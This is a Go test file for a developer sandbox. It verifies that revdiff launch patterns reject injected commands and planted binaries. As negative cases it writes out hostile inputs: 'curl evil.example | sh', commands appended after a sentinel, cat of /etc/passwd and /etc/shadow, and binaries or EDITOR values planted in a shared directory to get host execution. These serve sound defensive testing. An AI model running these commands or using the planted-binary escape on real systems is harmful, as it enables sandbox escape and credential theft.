package tools

import (
	"os"
	"path/filepath"
	"testing"

	"devsandbox/internal/cmdpattern"
	"devsandbox/internal/herdrproxy"
	"devsandbox/internal/kittyproxy"
)

func TestRevdiff_Name(t *testing.T) {
	r := &Revdiff{}
	if r.Name() != "revdiff" {
		t.Errorf("Name = %q", r.Name())
	}
}

func TestRevdiff_DeclaresLaunchOverlay(t *testing.T) {
	r := &Revdiff{}
	caps := r.KittyCapabilities()
	want := kittyproxy.CapLaunchOverlay
	for _, c := range caps {
		if c == want {
			return
		}
	}
	t.Errorf("CapLaunchOverlay missing from %v", caps)
}

func TestRevdiff_LaunchPatternsAcceptRevdiff(t *testing.T) {
	// Patterns now pin the revdiff binary to its resolved path, so the test
	// must reference that same path rather than a hardcoded one.
	bin, err := cmdpattern.ResolveProgram("revdiff")
	if err != nil {
		t.Skipf("revdiff not on PATH: %v", err)
	}

	r := &Revdiff{}
	patterns := r.KittyLaunchPatterns()
	if len(patterns) == 0 {
		t.Fatal("no launch patterns declared")
	}
	check := func(argv []string) bool {
		for _, p := range patterns {
			if p.MatchesArgv(argv) {
				return true
			}
		}
		return false
	}
	if !check([]string{bin, "--staged"}) {
		t.Error("plain revdiff invocation should match")
	}
	if !check([]string{"sh", "-c", "exec " + bin + " --output /tmp/x"}) {
		t.Error("sh -c 'exec revdiff …' should match")
	}
	if check([]string{"sh", "-c", "curl evil"}) {
		t.Error("unrelated sh -c invocation must not match")
	}

	// Upstream revdiff kitty launcher form (single-quoted argv + sentinel touch).
	launcherArg := "'" + bin + "' '--output=/tmp/revdiff-output-abc' '--staged'; touch '/tmp/revdiff-done-xyz'"
	if !check([]string{"sh", "-c", launcherArg}) {
		t.Error("revdiff launcher sentinel form should match")
	}

	// An attacker appending extra commands after the sentinel must still be rejected.
	evil := "'" + bin + "' '--staged'; touch '/tmp/revdiff-done-xyz'; curl evil"
	if check([]string{"sh", "-c", evil}) {
		t.Error("extra command after sentinel must not match")
	}

	// revdiff launcher v0.8.0+ wraps its command with `/usr/bin/env KEY=VAL ...`
	// so the kitty-spawned overlay inherits EDITOR/VISUAL from the caller shell.
	envWrapped := "'/usr/bin/env' 'EDITOR=nvim' 'VISUAL=nvim' '" + bin + "' '--output=/tmp/revdiff-output-abc'; touch '/tmp/revdiff-done-xyz'"
	if !check([]string{"sh", "-c", envWrapped}) {
		t.Error("env-wrapped revdiff launcher sentinel form should match")
	}

	// Same attacker append rejection for the env-wrapped form.
	envEvil := `'/usr/bin/env' 'EDITOR=nvim' '/bin/cat' '/etc/passwd'; touch '/tmp/revdiff-done-xyz'`
	if check([]string{"sh", "-c", envEvil}) {
		t.Error("env-wrapped non-revdiff program must not match")
	}

	// The actual launcher emits `/usr/bin/env` unquoted (only ENV_PREFIX and
	// the inner argv are single-quoted). Matching must accept this shape too.
	envUnquoted := "/usr/bin/env 'EDITOR=nvim' 'VISUAL=nvim' '" + bin + "' '--output=/tmp/revdiff-output-abc'; touch '/tmp/revdiff-done-xyz'"
	if !check([]string{"sh", "-c", envUnquoted}) {
		t.Error("unquoted-env revdiff launcher sentinel form should match")
	}

	// The unquoted-env form must still reject non-revdiff inner programs.
	envUnquotedEvil := `/usr/bin/env 'EDITOR=nvim' '/bin/cat' '/etc/passwd'; touch '/tmp/revdiff-done-xyz'`
	if check([]string{"sh", "-c", envUnquotedEvil}) {
		t.Error("unquoted-env non-revdiff program must not match")
	}

	// Bare `env` (PATH-relative) must not match when unquoted — only the
	// literal `/usr/bin/env` absolute prefix the launcher emits is accepted,
	// so attackers can't rely on $PATH shadowing.
	envBarePath := "env 'EDITOR=nvim' '" + bin + "' '--output=/tmp/x'; touch '/tmp/revdiff-done-xyz'"
	if check([]string{"sh", "-c", envBarePath}) {
		t.Error("bare `env` (no absolute path) must not match")
	}

	// An unquoted first token that isn't `/usr/bin/env` must not match.
	envUnquotedWrongProg := "/bin/curl 'EDITOR=nvim' '" + bin + "' '--output=/tmp/x'; touch '/tmp/revdiff-done-xyz'"
	if check([]string{"sh", "-c", envUnquotedWrongProg}) {
		t.Error("unquoted first token must be /usr/bin/env only")
	}
}

// TestRevdiff_LaunchPatternsRejectPlantedBinary is the regression test for the
// escape that motivated pinning ResolvedBin.
//
// The revdiff IPC directory is a write-through bind mounted at an identical
// path on the host and inside the sandbox, so a file the sandbox creates there
// is visible to the host at the same path. Matching argv[0] on basename alone
// accepted any path ending in "revdiff", so the sandbox could plant an
// executable there, name it in a launch request, and have the host run it as
// the host user. Every form below must be denied.
func TestRevdiff_LaunchPatternsRejectPlantedBinary(t *testing.T) {
	if _, err := cmdpattern.ResolveProgram("revdiff"); err != nil {
		t.Skipf("revdiff not on PATH: %v", err)
	}

	r := &Revdiff{}
	patterns := r.KittyLaunchPatterns()
	if len(patterns) == 0 {
		t.Fatal("no launch patterns declared")
	}
	check := func(argv []string) bool {
		for _, p := range patterns {
			if p.MatchesArgv(argv) {
				return true
			}
		}
		return false
	}

	// A plausible shared-temp path: $HOME/.cache/devsandbox/tmp/<session>.
	planted := filepath.Join(
		SharedTmpPath(os.Getenv("HOME"), "/some/sandbox/home"), "revdiff",
	)

	tests := []struct {
		name string
		argv []string
	}{
		{
			name: "direct invocation of planted binary",
			argv: []string{planted, "--staged"},
		},
		{
			name: "planted binary via sh -c",
			argv: []string{"sh", "-c", "exec " + planted + " --output /tmp/x"},
		},
		{
			name: "planted binary in sentinel launcher form",
			argv: []string{"sh", "-c", "'" + planted + "' '--output=/tmp/o'; touch '/tmp/revdiff-done-xyz'"},
		},
		{
			name: "planted binary in env-wrapped sentinel form",
			argv: []string{"sh", "-c", "/usr/bin/env 'EDITOR=nvim' '" + planted + "' '--output=/tmp/o'; touch '/tmp/revdiff-done-xyz'"},
		},
		{
			name: "planted binary in a plain temp directory",
			argv: []string{"/tmp/revdiff", "--staged"},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			if check(tt.argv) {
				t.Errorf("launch pattern accepted a planted binary: %q", tt.argv)
			}
		})
	}
}

// herdrTail reproduces the launcher's write_rc_cmd output.
func herdrTail(sentinel string) string {
	q := "'" + sentinel + "'"
	return "; rc=$?; printf \"%s\" \"$rc\" > " + q + ".tmp && mv -f " + q + ".tmp " + q
}

func TestRevdiff_HerdrCapabilities(t *testing.T) {
	r := &Revdiff{}
	caps := r.HerdrCapabilities()
	if len(caps) != 1 || caps[0] != herdrproxy.CapLaunchOverlay {
		t.Errorf("HerdrCapabilities() = %v, want exactly [launch_overlay]", caps)
	}
}

func TestRevdiff_HerdrLaunchScriptAcceptsRealLauncherBodies(t *testing.T) {
	bin, err := cmdpattern.ResolveProgram("revdiff")
	if err != nil {
		t.Skipf("revdiff not on PATH: %v", err)
	}
	pat := (&Revdiff{}).HerdrLaunchScript()
	const sentinel = "/tmp/revdiff-done-xyz"

	tests := []struct {
		name string
		head string
	}{
		{
			name: "minimal form",
			head: "REVDIFF_EXIT_CODE_ON_ANNOTATIONS=true '" + bin + "' '--output=/tmp/o'",
		},
		{
			name: "with config and extra args",
			head: "REVDIFF_EXIT_CODE_ON_ANNOTATIONS=true '" + bin + "' '--config=/home/u/.revdiff.yml' '--output=/tmp/o' 'main'",
		},
		{
			name: "with /usr/bin/env prefix",
			head: "/usr/bin/env 'EDITOR=nvim' 'VISUAL=nvim' REVDIFF_EXIT_CODE_ON_ANNOTATIONS=true '" + bin + "' '--output=/tmp/o'",
		},
		{
			name: "no env assignments",
			head: "'" + bin + "' '--output=/tmp/o'",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			body := "#!/bin/sh\n" + tt.head + herdrTail(sentinel) + "\n"
			if !pat.MatchesBody([]byte(body)) {
				t.Errorf("HerdrLaunchScript rejected a real launcher body:\n%s", body)
			}
		})
	}
}

func TestRevdiff_HerdrLaunchScriptRejects(t *testing.T) {
	bin, err := cmdpattern.ResolveProgram("revdiff")
	if err != nil {
		t.Skipf("revdiff not on PATH: %v", err)
	}
	pat := (&Revdiff{}).HerdrLaunchScript()
	const sentinel = "/tmp/revdiff-done-xyz"
	okHead := "'" + bin + "' '--output=/tmp/o'"

	// A binary the sandbox could plant in the write-through shared temp directory.
	planted := filepath.Join(SharedTmpPath(os.Getenv("HOME"), "/s/home"), "revdiff")

	tests := []struct {
		name string
		body string
	}{
		{
			name: "arbitrary script",
			body: "#!/bin/sh\ncurl evil.example | sh\n",
		},
		{
			name: "valid line plus an injected command",
			body: "#!/bin/sh\n" + okHead + herdrTail(sentinel) + "; curl evil.example\n",
		},
		{
			name: "injected command on a second line",
			body: "#!/bin/sh\n" + okHead + herdrTail(sentinel) + "\ncurl evil.example\n",
		},
		{
			name: "planted binary in the IPC directory",
			body: "#!/bin/sh\n'" + planted + "' '--output=/tmp/o'" + herdrTail(sentinel) + "\n",
		},
		{
			// The env prefix exists so the overlay inherits the caller's
			// editor, and revdiff spawns whatever EDITOR names — so a value
			// pointing at the write-through shared temp directory is host
			// execution by the same mechanism as a planted argv[0].
			name: "editor planted in the IPC directory",
			body: "#!/bin/sh\n/usr/bin/env 'EDITOR=" +
				filepath.Join(SharedTmpPath(os.Getenv("HOME"), "/s/home"), "evil") + "' " +
				okHead + herdrTail(sentinel) + "\n",
		},
		{
			name: "env binary planted in the IPC directory",
			body: "#!/bin/sh\n" + filepath.Join(SharedTmpPath(os.Getenv("HOME"), "/s/home"), "env") +
				" 'EDITOR=nvim' " + okHead + herdrTail(sentinel) + "\n",
		},
		{
			name: "revdiff by basename from /tmp",
			body: "#!/bin/sh\n'/tmp/revdiff' '--output=/tmp/o'" + herdrTail(sentinel) + "\n",
		},
		{
			name: "different program entirely",
			body: "#!/bin/sh\n'/bin/cat' '/etc/shadow'" + herdrTail(sentinel) + "\n",
		},
		{
			name: "no sentinel clause",
			body: "#!/bin/sh\n" + okHead + "\n",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			if pat.MatchesBody([]byte(tt.body)) {
				t.Errorf("HerdrLaunchScript accepted a body it must reject:\n%s", tt.body)
			}
		})
	}
}
